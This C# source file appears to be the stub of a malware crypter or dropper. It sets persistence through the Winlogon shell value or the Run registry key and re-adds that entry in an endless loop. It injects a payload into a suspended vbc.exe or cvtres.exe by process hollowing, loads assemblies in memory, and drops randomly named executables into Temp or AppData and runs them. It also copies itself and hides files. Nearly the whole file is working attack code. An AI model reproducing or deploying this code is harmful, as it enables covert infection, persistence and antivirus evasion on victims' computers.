using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
internal class Ax
{
    public static void Buzz(string name, string path, bool stealth, bool persist)
    {
        if (stealth)
        {
            RegistryKey RegKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
			RegKey.SetValue("shell", "explorer.exe,\"" + path + "\"", RegistryValueKind.String);
        }
        else
        {
            RegistryKey RegKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			RegKey.SetValue(name, path, RegistryValueKind.String);
			if (persist)
			{
				while(persist)
				{
					Persist(name, path);
				}
			}
        }
    }

	public static void Persist(string key, string path)
	{
		RegistryKey RegKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
		if (RegKey.GetValue(key) == null || RegKey.GetValue(key) == "")
			RegKey.SetValue(key, path, RegistryValueKind.String);

	}

    public static string rndmkey(int lenght, Random R)
    {
        StringBuilder builder = new StringBuilder("");
        char[] chArray = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm".ToCharArray();
        int num2 = lenght;
        for (int i = 1; i <= num2; i++)
        {
            builder.Append(chArray[R.Next(0, chArray.Length - 1)]);
        }
        return builder.ToString();
    }

    public static bool R(int file, string cmd, byte[] data, int where)
    {
        int num = 1;
        do
        {
            if (RunIt(file, data, where))
            {
                return true;
            }
            num++;
        }
        while (num <= 5);
        return false;
    }

    private static void kthxbai(string Path)
    {
        FileInfo Info = new FileInfo(Path);
        Info.Attributes = FileAttributes.Hidden;
    }

    private static void RunCLR(object asm)
    {
        MethodInfo entryPoint = ((Assembly)asm).EntryPoint;
        if (entryPoint.GetParameters().Length == 0)
        {
            entryPoint.Invoke(null, null);
        }
        else
        {
            entryPoint.Invoke(null, new object[] { new string[0] });
        }
    }

    private static void RunCLR(Assembly asm)
    {
        Thread thread = new Thread(new ParameterizedThreadStart(Ax.RunCLR));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start(asm);
    }

    public static bool RunIt(int file, byte[] bytes, int where)
    {
        try
        {
            try
            {
                RunCLR(Assembly.Load(bytes));
                return true;
            }
            catch (Exception)
            {
            }
            string str = "";
            switch (where)
            {
                case 1:
                    str = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "cvtres.exe");
                    break;
                case 2:
                    str = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
                    break;
                default:
                    str = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
                    break;
            }
            IntPtr zero = IntPtr.Zero;
            IntPtr[] pInfo = new IntPtr[4];
            byte[] sInfo = new byte[0x44];
            int num2 = BitConverter.ToInt32(bytes, 60);
            int num = BitConverter.ToInt16(bytes, num2 + 6);
            IntPtr ptr2 = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x54));
            if (CreateProcess(null, new StringBuilder(str), zero, zero, false, 4, zero, null, sInfo, pInfo))
            {
                uint[] ctxt = new uint[0xb3];
                ctxt[0] = 0x10002;
                if (GetThreadContext(pInfo[1], ctxt))
                {
                    IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);
                    IntPtr bufr = IntPtr.Zero;
                    IntPtr ptr5 = new IntPtr(4);
                    IntPtr numRead = IntPtr.Zero;
                    if (ReadProcessMemory(pInfo[0], baseAddr, ref bufr, (int)ptr5, ref numRead) && (NtUnmapViewOfSection(pInfo[0], bufr) == 0L))
                    {
                        int num3 = 0;
                        IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x34));
                        IntPtr sizel = new IntPtr(BitConverter.ToInt32(bytes, num2 + 80));
                        IntPtr lpBaseAddress = VirtualAllocEx(pInfo[0], addr, sizel, 0x3000, 0x40);
                        WriteProcessMemory(pInfo[0], lpBaseAddress, bytes, (uint)((int)ptr2), ref num3);
                        int num4 = num - 1;
                        int num6 = num4;
                        for (int i = 0; i <= num6; i++)
                        {
                            int[] dst = new int[10];
                            Buffer.BlockCopy(bytes, (num2 + 0xf8) + (i * 40), dst, 0, 40);
                            byte[] buffer2 = new byte[(dst[4] - 1) + 1];
                            Buffer.BlockCopy(bytes, dst[5], buffer2, 0, buffer2.Length);
                            sizel = new IntPtr(lpBaseAddress.ToInt32() + dst[3]);
                            addr = new IntPtr(buffer2.Length);
                            WriteProcessMemory(pInfo[0], sizel, buffer2, (uint)((int)addr), ref num3);
                        }
                        sizel = new IntPtr(ctxt[0x29] + 8L);
                        addr = new IntPtr(4);
                        WriteProcessMemory(pInfo[0], sizel, BitConverter.GetBytes(lpBaseAddress.ToInt32()), (uint)((int)addr), ref num3);
                        ctxt[0x2c] = (uint)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40));
                        SetThreadContext(pInfo[1], ctxt);
                    }
                }
                ResumeThread(pInfo[1]);
            }
        }
        catch (Exception)
        {
            return false;
        }
        return true;
    }

    public static void umad(byte[] bytes, int TempAppData, string extension, Random r)
    {
        string str2 = rndmkey(5, r).ToLower() + extension;
        string path = Conversions.ToString(Interaction.IIf(TempAppData == 0, Path.GetTempPath() + str2, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).Replace("Roaming", "") + str2));
        try
        {
            File.WriteAllBytes(path, bytes);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        Process.Start(path);
    }

    public static void umadmore(bool rndName, string location, bool start, int TempAppData, Random r)
    {
        if (rndName)
        {
            location = rndmkey(5, r).ToLower() + ".exe";
        }
        string path = Conversions.ToString(Interaction.IIf(TempAppData == 0, Path.GetTempPath() + location, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).Replace("Roaming", "") + location));
        try
        {
            File.WriteAllBytes(path, File.ReadAllBytes(Application.ExecutablePath));
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        if (start)
        {
            Process.Start(path);
        }
    }

    [DllImport("ntdll")]
    private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);
    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(IntPtr hThread);
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr sizel, int allocType, int prot);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref int lpNumberOfBytesWritten);
}


